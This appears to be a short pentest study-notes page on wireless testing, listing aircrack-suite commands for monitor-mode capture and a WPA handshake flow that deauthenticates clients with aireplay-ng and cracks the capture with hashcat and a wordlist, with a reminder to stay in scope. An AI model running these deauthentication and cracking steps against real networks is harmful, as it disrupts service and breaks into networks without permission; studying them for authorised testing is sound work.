# Wireless

Wireless notes are supporting reference material, not one of the three main H4G paths.

## Capture And Inspect

```bash
iw dev
airmon-ng
airodump-ng wlan0mon
```

## WPA Handshake Lab Flow

```bash
airodump-ng --bssid BSSID -c CHANNEL -w capture wlan0mon
aireplay-ng -0 5 -a BSSID wlan0mon
hashcat -m 22000 capture.22000 rockyou.txt
```

Only test wireless networks explicitly included in scope.

## Related

- [Networking](Networking.md)
- [Password Attacks](Password%20Attacks.md)
